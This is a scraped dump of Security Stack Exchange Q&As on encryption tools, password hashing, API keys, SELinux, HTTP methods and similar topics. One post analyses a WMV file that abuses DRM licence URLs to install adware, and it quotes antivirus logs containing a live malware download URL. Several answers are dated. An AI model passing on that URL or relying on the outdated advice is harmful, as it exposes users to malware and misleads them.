<p>Some more recent hash function designs have attempted to reuse <em>parts</em> of the AES -- to be precise, to use an internal operation which maps well on the <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"" rel=""nofollow noreferrer"">AES-NI</a> instructions which recent Intel and AMD processors feature. See for instance <a href=""http://crypto.rd.francetelecom.com/ECHO/"" rel=""nofollow noreferrer"">ECHO</a> and <a href=""http://www.cs.technion.ac.il/~orrd/SHAvite-3/"" rel=""nofollow noreferrer"">SHAvite-3</a>; these two functions both received quite a bit of exposure as part of the <a href=""http://csrc.nist.gov/groups/ST/hash/sha-3/index.html"" rel=""nofollow noreferrer"">SHA-3 competition</a> and are believed ""reasonably secure"". There are very fast on recent Intel and AMD processors. On other weaker architectures, were hash function performance has some chance to actually matter, these functions are quite slow.</p>

<p>There are other constructions which can make a hash function out of a block cipher, e.g. the one used in <a href=""http://www.skein-hash.info/"" rel=""nofollow noreferrer"">Skein</a>; but they also tend to require larger blocks than what the AES is defined over.</p>

<p><strong>Summary:</strong> not only are block ciphers and hash functions quite different; but the idea of building a hash function out of the AES turns out to be of questionable validity. It is not easy, and the limited AES block size is the main hindrance.</p>
","8064"
"TrueCrypt vs BitLocker","28494","","<p>I would like to ask which one of these TrueCrypt or BitLocker is safer to implement and encrypt the data in a small business environment (Windows 7, 8.1 and Windows Server 2012r)</p>

<p>I read about BitLocker and I am confused. Many IT professionals recommend using BitLocker however I read as well that BitLocker has an industry (Microsoft) backdoor implemented.</p>

<p>Not sure about TrueCrypt. Is there a backdoor or is TrueCrypt vulnerable and safe to use for business purposes?</p>

<p>I am more concerned about cyber criminals rather than IT Law enforcements.</p>
","<p><strong>Edit: October 3, 2015</strong> An <a href=""http://www.itworld.com/article/2987438/data-protection/newly-found-truecrypt-flaw-allows-full-system-compromise.html"">article in <em>IT World</em> for September 29, 2015</a> reveals the existence of, but doesn't describe fully, two serious flaws in the Windows driver that TrueCrypt installed.  It isn't clear from the article whether those flaws compromise the crypto or the underlying Windows OS, or both.  It also isn't clear whether that driver is installed only for full-disk encryption or at any time a TrueCrypt volume is in use.</p>

<p><strong>Original answer below:</strong></p>

<p>It is unknown (except probably to Microsoft and the NSA) whether BitLocker has a back door.  You cannot examine the source code to find out, either.  (And even if you could, a purposeful weakness might be very difficult to spot, even for an experienced cryptographer.)</p>

<p>TrueCrypt's source code is available and has (as of today) been audited.  No back doors or purposeful weaknesses were found.  So, speaking only in terms of back doors, TrueCrypt (the version before last) is ""safer"" because it can be and has been examined by experts.</p>

<p>Test it on Windows 10 before you commit because TrueCrypt is no longer supported by the original authors.</p>
","85153"
"Is it possible to force a browser to use http in an ssl enabled (https) website?","28445","","<p>I was doing a security research on storing the session id in local storage instead of storing it in cookies. I understand that it is not possible to tag the values in local storage as HttpOnly and so it may be vulnerable to XSS attacks. Since all the inputs are properly validated I am free from this issue. </p>

<p>But the other issue I found is the tampering of data while transferring to the server. Since my local storage session ID cannot be tagged under <code>Secure</code>, it is possible that it can be transmitted through an un-encrypted channel (HTTP). To mitigate this, I want to know if it is possible to access a page via HTTP which is secured with SSL.</p>
","<p>A page which is secured with SSL (or TLS for that matter) cannot be accessed via HTTP, as that would mean that the page is not secured anymore. </p>

<p>If I rephrase the question: <em>Is it possible to access a particular page of a HTTPS secured website via HTTP</em>, then I would say that is possible, but very INsecure. Moreover, the cookie with the session ID will probably have to be sent along with every page request, as you need to track the session across several pages. That would imply that you need to serve almost every page over HTTP, which thus renders your site insecure.</p>

<p>In case you need the session cookie on only one page, you could tell the client to carry out a HTTP request to that one page, which will then sent along all cookies that don't have the 'secure' flag set. However, this means that all these cookies are vulnerable to a MITM attack, and can be read by anyone listening in on your communication. </p>

<p>My advice: do not ever consciously serve a page of a HTTPS site over HTTP.</p>

<p>So, <strong>the question you need to ask yourself is</strong> <em>why can't my session ID be tagged secure only</em>. Is it laziness, or is there another reason why you cant tag this cookie as being secure? </p>

<hr>

<p>By the way, to force a browser to always use HTTPS for a website (and not rely on 302 redirects to visit the HTTPS version), HTTP Strict Transport Security can be used. Please refer to <a href=""https://www.owasp.org/index.php/HTTP_Strict_Transport_Security"" rel=""nofollow"">OWASP</a> for more information.</p>
","71521"
"Why is client-side hashing of a password so uncommon?","28441","","<p>There are very few websites that hash the users password before submitting it to the server. Javascript doesn't even have support for SHA or other algorithms.</p>

<p>But I can think of quite a few advantages, like protection against cross-site leaks or malicious admins, which SSL does not provide.</p>

<p>So why is this practise so uncommon among websites?</p>
","<p><strong>Inventor of JavaScript password hashing here</strong></p>

<p>Way back in 1998 I was building a Wiki, the first web site I'd built with a login system. There was no way I could afford hosting with SSL, but I was concerned about plaintext passwords going over the Internet. I'd read about CHAP (challenge hash authentication protocol) and realised I could implement it in JavaScript. I ended up publishing <a href=""http://pajhome.org.uk/crypt/md5/"" rel=""noreferrer"">JavaScript MD5</a> as a standalone project and it has become the most popular open source I've developed. The wiki never got beyond alpha.</p>

<p>Compared to SSL it has a number of weaknesses:</p>

<ul>
<li>Only protects against passive eavesdropping. An active MITM can tamper with the JavaScript and disable hashing.</li>
<li>Server-side hashes become password equivalents. At least in the common implementation; there are variations that avoid this.</li>
<li>Captured hashes can be brute forced. It is theoretically possible to avoid this using JavaScript RSA.</li>
</ul>

<p>I've always stated these limitations up front. I used to periodically get flamed for them. But I maintain the original principle to this day: If you've not got SSL for whatever reason, this is better than plaintext passwords. In the early 2000s a number of large providers (most notably Yahoo!) used this for logins. They believed that SSL even just for logins would have too much overhead. I think they switched to SSL just for logins in 2006, and around 2011 when Firesheep was released, most providers switched to full SSL.</p>

<p>So the short answer is: <strong>Client-side hashing is rare because people use SSL instead.</strong></p>

<p>There are still some potential benefits of client-side hashing:</p>

<ul>
<li>Some software doesn't know if it will be deployed with SSL or not, so it makes some sense to include hashing. vBulletin was a common example of this.</li>
<li>Server relief - with computationally expensive hashes, it makes sense for the client to do some of the work. See <a href=""https://security.stackexchange.com/questions/58704/can-client-side-hashing-reduce-the-denial-of-service-risk-with-slow-hashes"">this question</a>.</li>
<li>Malicious admins - client-side hashing can prevent malicious admins seeing plaintext passwords. This is usually dismissed because a malicious admin could modify the JavaScript and disable hashing. But in fairness, that action increases their chances of being detected, so there is some merit to this.</li>
</ul>

<p>Ultimately though these benefits are minor, and add a lot of complexity - there's a real risk that you'll introduce a more serious vulnerability in your attempt to improve security. And for people who want more security than password, multi-factor authentication is a better solution.</p>

<p>So the second short answer is: <strong>because multi-factor authentication provides more security than client-side password hashing.</strong></p>
","143857"
"How should API keys be generated?","28230","","<p>I want to make sure requests can't be forged and sent on to my server. In order to do this I need to generate an API key per user on my system. The purpose of the key will be to sign requests on the client side &amp; validate them on the server.</p>

<p>The question is, what are API keys generally made up of? Are they just a cryptographically secure random number (similar to a password salt)? Or is there some logic behind them e.g. should they be made up of data specific to the user.</p>

<p>In my system each user already has a unique ID (GUID) which isn't publically exposed, could I use this as my ""key"" or should an API key differ from a users ID?</p>
","<p>It depends on how much you want to separate roles.</p>

<p><strong>Basic system:</strong> your ""signature"" is a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">MAC</a>. The ""API key"" is a secret value with is shared between the server and the user. Normal MAC algorithms like <a href=""http://en.wikipedia.org/wiki/HMAC"">HMAC</a> can use arbitrary sequences of bits as key, so a key is easily generated by using <code>/dev/urandom</code> (Linux, *BSD, MacOS X), calling <code>CryptGenRandom()</code> (Win32) or using <code>java.security.SecureRandom</code> (Java).</p>

<p><strong>Enhanced system:</strong> your signature is a true <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signature</a>. This makes sense if you want to separate the key generator (who can produce keys which will be accepted by the server) from the server itself (who validates the incoming signatures). Keys for signature algorithms are mathematical objects with a lot of internal structure, and each algorithm implies a specific key generation algorithm. Use a library which already implements the needed bits (e.g. <a href=""http://www.openssl.org/"">OpenSSL</a>).</p>

<hr />

<p><strong>Either way,</strong> there is more to it than just key generation and signatures. For instance, you probably want to avoid <em>replay attacks</em>: an ill-intentioned third party spies on the network, and records a valid request signed by a regular user. Later on, the attacker sends the request again, complete with its signature, so as to replicate the effect. To avoid replay attacks, you must add some sort of external protocols, and these things are hard to do (it is not hard to define a protocol; it is <em>very</em> hard to define a <em>secure</em> protocol). Therefore, the smart thing to do is reusing an existing, well-vetted protocol, which, in practice, means <a href=""http://en.wikipedia.org/wiki/Transport_Layer_Security"">SSL/TLS</a>.</p>

<p>With SSL, the ""basic system"" is reduced to sending the API key in a header at the beginning of the conversation (that's exactly what happens with password authentication on HTTPS Web sites). The ""enhanced system"" is then ""SSL with a client certificate"".</p>
","19810"
"Generic error message for wrong password or username - is this really helpful?","28218","","<p>It is really common (and I would say it is some kind of security basic) to not show on the login page if the username or the password was wrong when a user tries to log in.
One should show a generic message instead, like ""Password or username are wrong"".</p>

<p>The reason is not to show potential attackers which usernames are already taken, so it'll be harder to 'hack' an existing account.</p>

<p>Sounded reasonable for me, but then something different came on my mind.</p>

<p>When you register your account, you type in your username. And when it is already taken, you get an error message - which is not generic! </p>

<p>So basically, an attacker could just grab 'correct' user names from the register page, or am I wrong?</p>

<p>So what is the point about generic messages than? Non-generic messages would lead to a much better UX.</p>
","<p>No, you are correct that at some point during efforts to prevent attackers from determining valid user identities you will either have to lie to them or provide exceptionally vague error messages.  </p>

<p>Your app could tell a user that ""the requested username is unavailable"" and not be specific as to whether it was already in use or just didn't meet your other username requirements (length, character usage, reserved words, etc.).  Of course, if these details are public then an attacker could work out that their guess failed due to the account being in use and not due to invalid format.</p>

<p>Then you also have your password reset system.  Do you accept any username/email address and say a message was sent even if that account wasn't in your database?  What about account lockout (if you're using it)?  Do you just tell the user that their credentials were invalid even if if they weren't but instead their account was locked out, hoping they contact customer support who can identify the problem?</p>

<p>It is beneficial to increase the difficulty for attackers to gather valid usernames, but it typically is at a cost of frustrating users.  Most of the lower security sites I've seen do use separate messages identifying whether the username or password is wrong just because they prefer to err on the side of keeping users happy.  You'll have to determine if your security requirements dictate prioritizing them over the user experience.</p>
","62667"
"Someone is trying to brute-force(?) my private mail server... very... slowly... and with changing IPs","28117","","<p>This has been going on for about 1-2 days now:</p>

<pre><code>heinzi@guybrush:~$ less /var/log/mail.log | grep '^Nov 27 .* postfix/submission.* warning'
[...]
Nov 27 03:36:16 guybrush postfix/submission/smtpd[7523]: warning: hostname bd676a3d.virtua.com.br does not resolve to address 189.103.106.61
Nov 27 03:36:22 guybrush postfix/submission/smtpd[7523]: warning: unknown[189.103.106.61]: SASL PLAIN authentication failed:
Nov 27 03:36:28 guybrush postfix/submission/smtpd[7523]: warning: unknown[189.103.106.61]: SASL LOGIN authentication failed: VXNlcm5hbWU6
Nov 27 04:08:58 guybrush postfix/submission/smtpd[8714]: warning: hostname b3d2f64f.virtua.com.br does not resolve to address 179.210.246.79
Nov 27 04:09:03 guybrush postfix/submission/smtpd[8714]: warning: unknown[179.210.246.79]: SASL PLAIN authentication failed:
Nov 27 04:09:09 guybrush postfix/submission/smtpd[8714]: warning: unknown[179.210.246.79]: SASL LOGIN authentication failed: VXNlcm5hbWU6
Nov 27 05:20:11 guybrush postfix/submission/smtpd[10175]: warning: hostname b3d0600e.virtua.com.br does not resolve to address 179.208.96.14
Nov 27 05:20:16 guybrush postfix/submission/smtpd[10175]: warning: unknown[179.208.96.14]: SASL PLAIN authentication failed:
Nov 27 05:20:22 guybrush postfix/submission/smtpd[10175]: warning: unknown[179.208.96.14]: SASL LOGIN authentication failed: VXNlcm5hbWU6
Nov 27 06:42:43 guybrush postfix/submission/smtpd[12927]: warning: hostname b18d3903.virtua.com.br does not resolve to address 177.141.57.3
Nov 27 06:42:48 guybrush postfix/submission/smtpd[12927]: warning: unknown[177.141.57.3]: SASL PLAIN authentication failed:
Nov 27 06:42:54 guybrush postfix/submission/smtpd[12927]: warning: unknown[177.141.57.3]: SASL LOGIN authentication failed: VXNlcm5hbWU6
Nov 27 08:01:08 guybrush postfix/submission/smtpd[14161]: warning: hostname b3db68ad.virtua.com.br does not resolve to address 179.219.104.173
Nov 27 08:01:13 guybrush postfix/submission/smtpd[14161]: warning: unknown[179.219.104.173]: SASL PLAIN authentication failed:
Nov 27 08:01:19 guybrush postfix/submission/smtpd[14161]: warning: unknown[179.219.104.173]: SASL LOGIN authentication failed: VXNlcm5hbWU6
</code></pre>

<p>There is one single failed login attempt every 1-2 hours, always from the same domain, but every time from a different IP address. Thus, it won't trigger fail2ban and the logcheck messages are starting to annoy me. :-)</p>

<p>My questions:</p>

<ol>
<li><p>What's the point of this kind of ""attack""? The rate is much too slow to do any efficient brute-forcing, and I really doubt that someone would specifically target my tiny personal server.</p></li>
<li><p>Is there anything I can do against it except banning that provider's complete IP range? I could just stop worrying and add those messages to my logcheck ignore config (since my passwords are strong), but that might cause me to miss more serious attacks.</p></li>
</ol>
","<blockquote>
  <p>What's the point of this kind of ""attack""? The rate is much too slow to do any efficient brute-forcing, and I really doubt that someone would specifically target my tiny personal server.</p>
</blockquote>

<p>The rate is slow, or the total <em>amount</em> of data being sent out is small? You may be seeing connections very rarely, but how do you know the bots doing the brute forcing aren't constantly saturating their uplinks, and your site is just one of many being attacked? There is no advantage for an attacker to spend a short time going after one site at a time (and triggering fail2ban), compared to attacking a huge number of servers at once, where each server only sees infrequent connections. Both can have the same rate of outgoing authentication attempts per second.</p>

<blockquote>
  <p>Is there anything I can do against it except banning that provider's complete IP range (or ignoring the messages, since my passwords are strong)?</p>
</blockquote>

<p>Unlikely. Chances are, these are coming from a botnet or a cluster of low-cost VPSes. It is not possible to determine what other IP ranges may be being used just by seeing a few of these. If they are not on the same subnet, they cannot be predicted. You can safely ignore these connections. It is nothing more than the background noise of the internet.</p>
","174406"
"Can a powered down cell phone be turned on remotely?","28027","","<p>I know this is tin-foil hat fodder, but at least <a href=""http://www.politechbot.com/docs/fbi.ardito.roving.bug.opinion.120106.txt"" rel=""noreferrer"">one judicial opinion</a> referenced a bug that could track/listen in on the subject ""whether the phone
was powered on or off,"" although that may have been a judge misinterpreting the technobabble spouted at him, or an FBI agent overhyping their tech to the judge.  </p>

<p>It seems like with smartphones all the rage now, it would be possible, e.g. to create a root kit that would simply mimic the phone entering a powered down state while still transmitting, although this would have an obvious effect on battery life unless it actually powered down most of the time and just woke up to transmit basic location information in a heartbeat configuration.  Is there anything similar out there in use by either ""good guys"" or ""bad guys"" that you know of?</p>
","<p>A Korean researcher demonstrated this on Samsung Smart TVs at Black Hat this year.  (<a href=""https://media.blackhat.com/us-13/US-13-Lee-Hacking-Surveilling-and-Deceiving-Victims-on-Smart-TV-Slides.pdf"">Slide deck here</a>.)  He mentions that the malware was originally designed for cell phones, and that TV sets were even easier to attack because battery life did not give them away.</p>

<p>His basic premise is that if he owns your device, he owns the power indicators, too.</p>

<p>Remote power-on isn't a problem when it's never actually powered off.</p>
","46785"
"Comparison Between AppArmor and Selinux","27976","","<p>I was reviewing several different comparison of AppArmor and Selinux which include</p>

<ul>
<li><a href=""http://www.insanitybit.com/2012/06/01/why-i-like-apparmor-more-than-selinux-5/"">Why I Like AppArmor More Than SELinux</a></li>
<li><a href=""http://www.scribd.com/doc/230617085/SELinux-and-AppArmor-An-Introductory-Comparison"">SELinux and AppArmor: An Introductory Comparison</a></li>
</ul>

<p>From these articles I conclude that AppArmor is better than SELinux based on AppArmor is far less complex and far shorter learning curve. Thus majority of comparsion are in favour of AppArmor but how can i say that AppArmor is more secure than Selinux?</p>
","<p>These security systems provide tools to isolate applications from each other...  and in turn isolate an attacker from the rest of the system when an application is compromised.</p>

<p>SELinux rule sets are incredibly complex but with this complexity you have more control over how processes are isolated.  Generating these policies <a href=""http://magazine.redhat.com/2007/08/21/a-step-by-step-guide-to-building-a-new-selinux-policy-module/"">can be automated</a>.  A strike against this security system is that its very difficult to independently verify. </p>

<p>AppArmor (and SMACK) is very straight forward.  These rule-sets really have to be written by a human, and is just adding another level of file access control (RWX).  In Linux everything is a file and this level of control ""should be enough"".  This system is very easy to independently verify.</p>
","29390"
"Can a rogue .wmv file ""hijack"" Windows Media Player?","27948","","<p>I've downloaded a <code>.wmv</code> file using P2P. Attempting to play it with Media Player Classic (K-Lite Codec Pack) only gave me a green square in the playback window:</p>

<p><a href=""https://i.stack.imgur.com/162sV.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/162sV.png"" alt=""enter image description here""></a></p>

<p>I noticed that the video came with a readme file, however; I found the following inside:</p>

<blockquote>
  <p>This video has been encoded using the latest DivX+ software, if you are having trouble playing this video please try windows media player 
  Media Player should automatically update any out dated codecs</p>
</blockquote>

<p>Since the K-Lite Codec Pack is my media software of choice, I decided to visit their site to see if there was an upgrade available. Indeed, the latest version at the moment of writing was released on November 19th 2015 (the version I was using had been installed on my PC at the beginning of November because I'd bought a new hard drive and reinstalled the OS). I've downloaded and installed the update, but nothing changed, I still got the same green square.</p>

<p>Now, this part I am ashamed of; instead of getting suspicious, I did what the file suggested, i.e. ran it in WMP, which indeed suggested that I download some codecs. I let it do it, typed the admin password because my account is a regular one, and then a few interesting things happened.</p>

<ol>
<li>UAC has been disabled without me doing anything; Windows showed a prompt telling me that I need to reboot to disable it, and when I checked the settings, it has indeed been turned off</li>
<li>Opera Browser has been installed and a shortcut was put on my desktop</li>
<li>NOD32, the AV I'm using, went crazy: two HTTP requests have been blocked and two executables quarantined, logs follow:</li>
</ol>

<p><strong>Network:</strong></p>

<blockquote>
  <p>15/11/22 3:35:29
  PM    <a href=""http://dl.tiressea.com/download/dwn/kmo422/us/setup_ospd_us.exe"" rel=""noreferrer"">http://dl.tiressea.com/download/dwn/kmo422/us/setup_ospd_us.exe</a> Blocked
  by internal IP
  blacklist C:\Users\admin\AppData\Local\Temp\beeibedcid.exe    desktop\admin   37.59.30.197
  <br>15/11/22 3:35:29 PM   <a href=""http://dl.tiressea.com/download/dwn/kmo422/us/setup_ospd_us.exe"" rel=""noreferrer"">http://dl.tiressea.com/download/dwn/kmo422/us/setup_ospd_us.exe</a> Blocked
  by internal IP
  blacklist C:\Users\admin\AppData\Local\Temp\beeibedcid.exe    desktop\admin   37.59.30.197</p>
</blockquote>

<p><strong>Local files:</strong></p>

<blockquote>
  <p>15/11/22 3:35:38 PM   Real-time file system
  protection    file    C:\Users\admin\AppData\Local\Temp\81448202922\1QVdFL1BTSQ==0.exe    a
  variant of Win32/Adware.ConvertAd.ACN application cleaned by deleting
  - quarantined desktop\admin   Event occurred on a new file created by the application: C:\Users\admin\AppData\Local\Temp\beeibedcid.exe.
  <br><br>15/11/22 3:35:35 PM   Real-time file system
  protection    file    C:\Users\admin\AppData\Local\Microsoft\Windows\INetCache\IE\51L9SWGF\VOPackage<a href=""https://i.stack.imgur.com/162sV.png"" rel=""noreferrer"">1</a>.exe   a
  variant of Win32/Adware.ConvertAd.ACN application cleaned by deleting
  (after the next restart) - quarantined    desktop\admin   Event occurred on
  a new file created by the application:
  C:\Users\admin\AppData\Local\Temp\beeibedcid.exe.</p>
</blockquote>

<p><code>beeibedcid.exe</code> had been running as a process before I killed it manually using the task manager. Even though ESET didn't touch it, it's no longer in <code>AppData\Local\Temp</code>.</p>

<p>Upon closer inspection, I realized that the prompt WMP opens to allow me to ""update my codecs"" doesn't look like a WMP component:</p>

<p><a href=""https://i.stack.imgur.com/mybFF.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/mybFF.png"" alt=""enter image description here""></a></p>

<p>The UI differs in certain subtle ways, and the sentence composition/syntax is poor. Undeniably though the most suspicious thing is the domain in the upper left corner, <code>playrr.co</code>; a <a href=""https://who.is/whois/playrr.co"" rel=""noreferrer"">simple <code>whois</code> lookup</a> reveals that the domain has been registered on November 17th this year - five days ago - and the registrant is WhoisGuard, so the actual registrant clearly wanted to conceal their details.</p>

<p>Note that clicking both ""Download Fix"" and ""Web Help"" has the same effect; the following IE download prompt pops up:</p>

<p><a href=""https://i.stack.imgur.com/jqSPF.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/jqSPF.png"" alt=""enter image description here""></a></p>

<p>I should add that the video I downloaded had been uploaded on 2015-11-22 13:29:23 GMT, roughly an hour before I downloaded it. The OS is Windows 8.1 Pro x64 and the AV is ESET Nod32 AV 7.0.302.0, with the latest signatures.</p>

<p>I'm annoyed at myself because this is a fairly obvious trap, but at the same time I'd never think to check Windows Media Player dialogs for obvious trojan/adware!</p>

<ul>
<li>How does this thing work? It couldn't have possibly affected my Windows Media Player executable before it was played because it's a media file. Is this a recent vulnerability discovered in the software? Because I doubt Microsoft would allow media files to specify a site to download codecs from...</li>
<li>No matter what it is, it seems to be a relatively new thing. What can I do to ensure others don't fall for this? I don't think any AV vendor would allow me to submit a <code>.wmv</code> file a few hundred megabytes in size for analysis.</li>
</ul>

<p>Thanks for your time.</p>
","<p>This video file uses (well, abuses) Windows Media Player's DRM functionalities which allows content providers to embed an URL in their protected content that will be displayed in a Windows Media Player window to allow the user acquire a license to play the content. Its legitimate usage goes like this :</p>

<ul>
<li>user registers on an online music store and downloads some DRM-protected files, which have their actual media content encrypted</li>
<li>user opens them in Windows Media Player, it opens a window with the URL specified in the media file, in this case a legitimate URL from the music store which asks for the user's login</li>
<li>user enters his credentials, the music store authenticates them and gives WMP the decryption key which is then cached and the file can now be played</li>
</ul>

<p>In this case, the feature has been abused to display a fake WMP error about missing codecs (it's in reality a webpage, as the domain name in the top bar suggests, and if it was real the window would've been much smaller) to make you click a (fake) button that points to malware masquerading as codecs.</p>

<p>There's some more info about this DRM system on <a href=""https://en.wikipedia.org/wiki/Windows_Media_DRM"" rel=""nofollow noreferrer"">Wikipedia</a>, and it seems to be deprecated in favour of PlayReady. Whether this new iteration will allow such abuse isn't yet known.</p>
","106199"
"Why are DSA keys referred to as DSS keys when used with SSH?","27880","","<p>When I generate a DSA key with <code>ssh-keygen -t dsa</code>, the resulting public key will begin with <code>ssh-dss</code>.</p>

<p>How come? Why not <code>ssh-dsa</code>?</p>
","<p>DSS is simply a document that describes the signing procedure and specifies certain standards. The original document is FIPS 186 and latest revision in 2013 is <a href=""http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf"">FIPS 186-4</a>. DSS is a <strong>standard</strong> for digital signing.</p>

<p>DSA is a cryptographic algorithm that generates keys, signs data, and verifies signatures. DSA, in itself, can use any hash function for its internal ""cryptomagic"", and it can also use any <em>(L, N)</em> for its parameters' length. DSS, as a standard, <em>defines</em> DSA's optional specifications.</p>

<p>DSS says that DSA should use SHA-1 as its hash function (recently, SHA-2). DSS says that DSA should use specific length pairs such as (2048,224), (3072,256), etc.</p>

<p>When SSH says DSS, they mean that they're implementing DSA in compliance with the DSS.</p>
","51575"
"How do large companies protect their source code?","27860","","<p>I recently read the <a href=""https://security.stackexchange.com/a/24906/71460"">canonical answer</a> of <a href=""https://security.meta.stackexchange.com/a/1413/71460"">our ursine overlord</a> to the question on <a href=""https://security.stackexchange.com/q/24896/71460"">How do certification authorities store their private root keys?</a></p>

<p>I then just had to ask myself:<br>
<strong>How do large companies (e.g. Microsoft, Apple, ...) protect their valuable source code?</strong></p>

<p>In particular I was asking myself, how do they protect their source code against theft, against malicious externally based modification and against malicious insider-based modification.</p>

<p>The first sub-question was already (somewhat) answered in <a href=""https://security.stackexchange.com/a/17284/71460"">CodeExpress' answer</a> on <a href=""https://security.stackexchange.com/q/17276/71460"">How to prevent private data being disclosed outside of Organization</a>.</p>

<p>The reasoning for the questions is simple:</p>

<ul>
<li>If the source code would be stolen, a) would the company be (at least partially) hindered from selling it and b) would the product be at risk of source code based attack search. Just imagine what would happen if the Windows or iOS source code was stolen.</li>
<li>If the code would be modified by malicious external attackers, secret backdoors may be added which can be catastrophic. This is what happened with Juniper lately, <a href=""https://www.imperialviolet.org/2015/12/19/juniper.html"" rel=""nofollow noreferrer"">where the coordinates of the second <code>DUAL_EC_DRBG</code> point were replaced in their source.</a></li>
<li>If the code would be modified by an internal attacker (e.g. an Apple iOS engineer?) that person could make a lot of money by selling said backdoors and can put the product at severe risk if the modified version ships.</li>
</ul>

<p>Please don't come up with ""law"" and ""contracts"". While these are effective measures against theft and modification, they certainly don't work as well as technical defenses and won't stop aggressive attackers (<em>i.e.</em> other governments' agencies).</p>
","<p>First off, I want to say that just because a company is big doesn't mean their security will be any better.</p>

<p>That said, I'll mention that having done security work in a large number of Fortune 500 companies, including lots of name-brands most people are familiar with, I'll say that currently 60-70% of them don't do as much as you'd think they should do. Some even give hundreds of third-party companies around the world full access to pull from their codebase, but not necessarily write to it.</p>

<p>A few use multiple private Github repositories for separate projects with two-factor authentication enabled and tight control over who they grant access too and have a process to quickly revoke access when anyone leaves. </p>

<p>A few others are very serious about protecting things, so they do everything in house and use what to many other companies would look like excessive levels of security control and employee monitoring. These companies use solutions like Data Loss Prevention (DLP) tools to watch for code exfiltration, internal VPN access to heavily hardened environments just for development with a ton of traditional security controls and monitoring, and, in some cases, full-packet capture of all traffic in the environment where the code is stored. But as of 2015 this situation is still very rare.</p>

<p>Something that may be of interest and which has always seemed unusual to me is that the financial industry, especially banks, have far worse security than one would think and that the pharmaceutical industry are much better than other industries, including many defense contractors. There are some industries that are absolutely horrible about security. I mention this because there are other dynamics at play: it's not just big companies versus small ones, a large part of it has to do with organizational culture.</p>

<p>To answer your question, I'm going to point out that it's the business as a whole making these decisions and not the security teams. If the security teams were in charge of everything, or even knew about all the projects going on, things probably wouldn't look anything like they do today.</p>

<p>That said, you should keep in mind that most large businesses are publicly traded and for a number of reasons tend to be much more concerned with short-term profits, meeting quarterly numbers, and competing for marketshare against their other large competitors than about security risks, even if the risks could effectively destroy their business. So keep that in mind when reading the following answers.</p>

<ul>
<li><p>If source code were stolen:</p>

<p>a. Most wouldn't care and it would have almost no impact on their brand or sales. Keep in mind that the code itself is in many cases not what stores the value of a companies offering. If someone else got a copy of Windows 10 source they couldn't suddenly create a company selling a Windows 10 clone OS and be able to support it. The code itself is only part of the solution sold. </p>

<p>b. Would the product be at greater risk because of this ? yes absolutely. </p></li>
<li><p>External Modification: Yes, but this is harder to do, and easier to catch. That said, since most companies are not seriously monitoring this it's a very real possibility that this has happened to many large companies, especially if back-door access to their software is of significant value to other nation-states. This probably happens a lot more often than people realize.</p></li>
<li><p>Internal Attacker: Depending on how smart the attacker was, this may never even be noticed or could be made to look like an inconspicuous programming mistake. Outside of background checks and behavior monitoring, there is not much that can prevent this, but hopefully some source-code analysis tools would catch this and force the team to correct it. This is a particularly tough attack to defend against and is the reason a few companies don't outsource work to other countries and do comprehensive background checks on their developers. Static source code analysis tools are getting better, but there will always be gap between what they can detect and what can be done.</p></li>
</ul>

<p>In a nutshell, the holes will always come out before the fixes, so dealing with most security issues becomes something of a race against time. Security tools help give you time-tradeoffs but you'll never have ""perfect"" security and getting close to that can get very expensive in terms of time (slowing developers down or requiring a lot more man-hours somewhere else).</p>

<p>Again, just because a company is big doesn't mean they have good security. I've seen some small companies with <em>much</em> better security than their larger competitors, and I think this will increasingly be the case since smaller companies that want to take their security more seriously don't have to do massive organizational changes, where larger companies will be forced to stick with the way they've been doing things in the past due to the transition cost.</p>

<p>More importantly, I think it's easier for a new company (of any size, but especially smaller ones) to have security heavily integrated into it's core culture rather having to change their current/legacy cultures like older companies have to. There may even be opportunities now to take market share away from the a less secure product by creating a very secure version of it. Likewise, I think your question is important for a totally different reason: security is still in it's infancy, so we need better solutions in areas like code management where there is a lot of room for improvement.</p>
","109094"
"How is HTTP PUT and DELETE methods insecure, if they really are?","27831","","<p>If I really need to use these methods, how do i make sure they are secure?</p>

<p>Edit: Is there a link or source where I can see how to make sure that 'PUT' and 'DELETE' methods are not able to delete or update resource, but services and servlets are still able to use PUT and DELETE.</p>

<p>Following services are using PUT and DELETE HTTP methods</p>

<p><a href=""https://developers.google.com/drive/v2/reference/files/delete"" rel=""nofollow"">https://developers.google.com/drive/v2/reference/files/delete</a></p>

<p><a href=""http://developers.facebook.com/docs/reference/api/Comment/"" rel=""nofollow"">http://developers.facebook.com/docs/reference/api/Comment/</a></p>

<p><a href=""http://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectDELETE.html"" rel=""nofollow"">http://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectDELETE.html</a></p>

<p><a href=""http://www.salesforce.com/us/developer/docs/api_rest/index.htm"" rel=""nofollow"">http://www.salesforce.com/us/developer/docs/api_rest/index.htm</a></p>

<p><a href=""http://developer.tradeshift.com/rest-api/#tsapi.conventions"" rel=""nofollow"">http://developer.tradeshift.com/rest-api/#tsapi.conventions</a></p>

<p><a href=""http://developer.linkedin.com/documents/groups-api#create"" rel=""nofollow"">http://developer.linkedin.com/documents/groups-api#create</a></p>

<p><a href=""https://developer.paypal.com/webapps/developer/docs/api/#delete-a-stored-credit-card"" rel=""nofollow"">https://developer.paypal.com/webapps/developer/docs/api/#delete-a-stored-credit-card</a></p>

<p>So, clearly there has to be a way of making sure that PUT and DELETE can be used without putting resource files to harm like HTML, CSS, JS, or images.</p>
","<p>PUT and DELETE are not intrinsically insecure, they are used without problems at many <a href=""https://en.wikipedia.org/wiki/Representational_state_transfer"" rel=""nofollow"">REST services</a> for example.</p>

<p>In my practice the main problem related to these HTTP verbs (apart from the common authentication and authorization problems) was that the server operators weren't aware of their existence introducing the possibility of <a href=""https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003)"" rel=""nofollow"">HTTP Verb Tampering</a>. In summary this means that access control was implemented based on a HTTP verb blacklist but some lesser known verbs were missing from this list allowing access control bypass. </p>

<p>I'd like to note that many web servers implement their own custom (sometimes undocumented) HTTP verbs, so this kind of ""Verb-Based Access Control"" doesn't seem like a very good idea anyway.</p>
","38639"
